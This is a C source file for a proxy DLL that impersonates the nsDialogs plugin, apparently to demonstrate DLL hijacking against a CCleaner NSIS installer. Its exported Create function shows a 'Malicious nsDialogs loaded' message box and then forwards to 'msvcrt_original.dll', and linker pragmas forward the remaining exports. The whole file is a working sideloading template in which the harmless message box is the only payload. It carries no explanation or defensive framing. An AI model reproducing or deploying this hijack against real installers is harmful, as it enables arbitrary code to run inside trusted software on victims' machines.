#include <windows.h>

// lol this is the proxy
__declspec(dllexport) void* __stdcall Create(HWND h) {
    MessageBoxW(NULL, L"Malicious nsDialogs loaded", L"CCleaner", MB_OK);
    
    // just call the real one
    static void* (*realCreate)(HWND) = NULL;
    if (!realCreate) {
        HMODULE m = LoadLibraryW(L"msvcrt_original.dll");
        if (m) realCreate = (void* (*)(HWND))GetProcAddress(m, "Create");
    }
    return realCreate ? realCreate(h) : NULL;
}

// forward everything else
#pragma comment(linker, "/EXPORT:CreateControl=msvcrt_original.CreateControl")
#pragma comment(linker, "/EXPORT:CreateItem=msvcrt_original.CreateItem")
#pragma comment(linker, "/EXPORT:CreateTimer=msvcrt_original.CreateTimer")
#pragma comment(linker, "/EXPORT:GetUserData=msvcrt_original.GetUserData")
#pragma comment(linker, "/EXPORT:KillTimer=msvcrt_original.KillTimer")
#pragma comment(linker, "/EXPORT:OnBack=msvcrt_original.OnBack")
#pragma comment(linker, "/EXPORT:OnChange=msvcrt_original.OnChange")
#pragma comment(linker, "/EXPORT:OnClick=msvcrt_original.OnClick")
#pragma comment(linker, "/EXPORT:OnNotify=msvcrt_original.OnNotify")
#pragma comment(linker, "/EXPORT:SelectFileDialog=msvcrt_original.SelectFileDialog")
#pragma comment(linker, "/EXPORT:SelectFolderDialog=msvcrt_original.SelectFolderDialog")
#pragma comment(linker, "/EXPORT:SetRTL=msvcrt_original.SetRTL")
#pragma comment(linker, "/EXPORT:SetUserData=msvcrt_original.SetUserData")
#pragma comment(linker, "/EXPORT:Show=msvcrt_original.Show")

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}